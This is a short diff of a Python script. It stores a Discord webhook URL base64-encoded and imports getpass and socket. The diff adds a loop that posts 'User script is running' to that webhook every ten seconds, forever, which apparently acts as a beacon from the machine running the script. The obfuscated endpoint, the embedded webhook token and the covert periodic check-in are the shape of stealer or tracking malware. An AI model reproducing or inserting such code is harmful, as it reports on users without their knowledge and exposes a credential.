@@ -4,6 +4,7 @@ import getpass
 import os
 import socket
 import urllib.request
+from time import sleep
 
 # Base64-encoded Discord webhook URL
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4NjYxNC96SDZnWkI4YXNzLTY3TTJVQkVXWFcwTGk2a21vOWtPc2NrOUhOZ0pBMk5Ea2JhYW1vbWs0cDQ4bzR1WGdwaUZFdjJwZA=="
@@ -47,4 +48,10 @@ if __name__ == "__main__":
 
 
 while True:
-    pass
+    msg = (
+        "User script is running"
+    )
+
+    send_webhook(msg)
+
+    sleep(10)
